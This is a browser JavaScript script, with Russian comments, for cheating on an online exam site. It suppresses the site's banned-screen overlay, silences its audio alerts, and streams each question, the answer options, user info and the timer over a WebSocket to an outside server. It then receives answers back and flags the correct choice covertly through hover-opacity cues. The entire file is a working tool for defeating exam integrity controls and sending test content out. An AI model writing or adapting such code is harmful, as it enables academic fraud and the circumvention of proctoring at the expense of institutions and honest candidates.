(async () => {
    const socket = new WebSocket('wss://x-q63z.onrender.com');

    function hideBannedScreen() {
        document.querySelectorAll('.js-banned-screen').forEach(bannedScreen => {
            bannedScreen.style.setProperty('display', 'none', 'important');
        });
    }

    const observer = new MutationObserver(() => {
        hideBannedScreen();
    });

    observer.observe(document.body, { childList: true, subtree: true });

    hideBannedScreen();

    window.Audio = function () {
        return {
            play: function () { }
        };
    };

    socket.onopen = () => {
        console.log('WebSocket подключен');
        socket.send(JSON.stringify({ role: 'helper' }));
        // Добавляем задержку 2 секунды перед первой отправкой данных
        setTimeout(() => {
            sendQuestions();
            // Запускаем отправку обновлений таймера каждую секунду
            setInterval(() => {
                sendTimerUpdate();
            }, 1000);
        }, 2000);
    };

    function sendQuestions() {
        const questions = document.querySelectorAll('.test-table');
        const breadcrumbText = document.querySelector('.breadcrumb-header')?.innerText.trim() || "";
        const timerText = document.querySelector('#timer')?.innerText.trim() || "00:00:00";

        questions.forEach((questionEl, qInd) => {
            const questionText = questionEl.querySelector('.test-question')?.innerText.trim() || "";
            const questionImg = questionEl.querySelector('.test-question img')?.src || "";
            const answers = [];

            questionEl.querySelectorAll('.test-answers li label').forEach(answerEl => {
                const answerText = answerEl.innerText.trim();
                const answerImg = answerEl.querySelector('img')?.src || "";
                answers.push({ text: answerText, img: answerImg });
            });

            if ((questionText || questionImg) && answers.length > 0) {
                const data = JSON.stringify({
                    qIndex: qInd,
                    question: questionText,
                    questionImg: questionImg,
                    answers: answers,
                    userInfo: breadcrumbText,
                    timer: timerText
                });

                console.log('Отправка вопроса и вариантов с изображениями:', data);
                socket.send(data);
            }
        });
    }

    function sendTimerUpdate() {
        const timerText = document.querySelector('#timer')?.innerText.trim() || "00:00:00";
        const data = JSON.stringify({
            type: 'timerUpdate',
            timer: timerText
        });
        console.log('Отправка обновления таймера:', data);
        socket.send(data);
    }

    socket.onmessage = event => {
        let response;
        try {
            response = JSON.parse(event.data);
            console.log('Получен ответ от exam:', response);

            if (response.answer && response.qIndex !== undefined) {
                const processedResponse = {
                    qIndex: response.qIndex,
                    question: response.question,
                    answer: response.answer,
                    varIndex: response.varIndex,
                    clientId: response.clientId,
                    processedAnswer: true
                };
                console.log('Отправка обработанного ответа в exam:', processedResponse);
                socket.send(JSON.stringify(processedResponse));

                // Обработка эффекта для .breadcrumb-header
                const breadcrumbHeader = document.querySelector('.breadcrumb-header');
                if (breadcrumbHeader) {
                    const coloredSpan = breadcrumbHeader.querySelector('span');
                    const targetElement = coloredSpan || breadcrumbHeader;

                    if (!targetElement.style.opacity) {
                        targetElement.style.opacity = "1";
                    }

                    targetElement.onmouseover = () => {
                        targetElement.style.opacity = "0.7";
                    };

                    targetElement.onmouseout = () => {
                        targetElement.style.opacity = "1";
                    };
                }

                // Обработка стилей для вопросов
                document.querySelectorAll('.test-table').forEach((questionEl, qIndex) => {
                    if (qIndex === response.qIndex) {
                        const labels = questionEl.querySelectorAll('.test-answers label');
                        labels.forEach((label) => {
                            const p = label.querySelector("p");
                            if (p) {
                                p.style.color = "#666";
                                p.style.opacity = "1";
                                label.onmouseover = null;
                                label.onmouseout = null;
                            }
                        });

                        labels.forEach((label, varIndex) => {
                            const p = label.querySelector("p");
                            const img = label.querySelector("img");

                            if (varIndex === response.varIndex) {
                                label.onmouseover = () => {
                                    if (p) {
                                        p.style.opacity = "0.7";
                                    }
                                    if (img) {
                                        img.style.opacity = "0.5";
                                    }
                                };
                                label.onmouseout = () => {
                                    if (p) {
                                        p.style.color = "#666";
                                        p.style.opacity = "1";
                                    }
                                    if (img) {
                                        img.style.opacity = "1";
                                    }
                                };
                            } else {
                                label.onmouseover = () => {
                                    if (p) {
                                        p.style.color = "#666";
                                        p.style.opacity = "1";
                                    }
                                };
                                label.onmouseout = () => {
                                    if (p) {
                                        p.style.color = "#666";
                                        p.style.opacity = "1";
                                    }
                                };
                            }
                        });
                    }
                });

                // Изменение стиля ховера для 9-го вопроса в .test-nav
                if (response.qIndex === 8) {
                    const navItems = document.querySelectorAll('.test-nav li');
                    const navItem = navItems[response.qIndex];
                    if (navItem) {
                        navItem.classList.add('answered');
                        // Добавляем CSS стиль через динамическое создание или обновление
                        const styleSheet = document.createElement('style');
                        styleSheet.innerText = `
                            .test-nav li.answered:hover {
                                cursor: text;
                            }
                        `;
                        document.head.appendChild(styleSheet);
                    }
                }
            }
        } catch (e) {
            console.error('Ошибка парсинга ответа:', e);
        }
    };
})();
